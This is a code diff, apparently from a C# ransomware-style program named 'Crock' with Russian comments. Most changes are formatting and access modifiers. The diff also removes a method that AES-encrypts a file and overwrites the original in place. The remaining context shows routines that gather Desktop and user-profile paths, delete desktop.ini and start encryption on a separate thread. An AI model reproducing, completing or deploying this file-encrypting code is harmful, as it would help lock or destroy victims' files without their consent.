@@ -8,8 +8,8 @@ using System.Threading;
 
 namespace Crock
 {
-    static partial class Program
-    {
+	static partial class Program
+	{
 		// Кастыль для шифрования файла
 		class EncryptionFile
 		{
@@ -29,9 +29,9 @@ namespace Crock
 		}
 
 		class Crypt
-        {
+		{
 			// Уоление desktop.ini
-			static void Destopini()
+			private static void Destopini()
 			{
 				string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
 				string filepath = (path + @"\desktop.ini");
@@ -81,23 +81,8 @@ namespace Crock
 				return encryptedBytes;
 			}
 
-			// Шифрование файла
-			static void EncryptFile(string file, string password)
-			{
-				byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
-				byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
-
-				passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
-
-				byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
-
-				string fileEncrypted = file;
-
-				File.WriteAllBytes(fileEncrypted, bytesEncrypted);
-			}
-
 			// Процесс шифрования
-			static void Start_Encrypt()
+			private static void Start_Encrypt()
 			{
 				string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
 				string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
@@ -156,5 +141,5 @@ namespace Crock
 				new Thread(() => Start_Encrypt()).Start();
 			}
 		}
-    }
+	}
 }
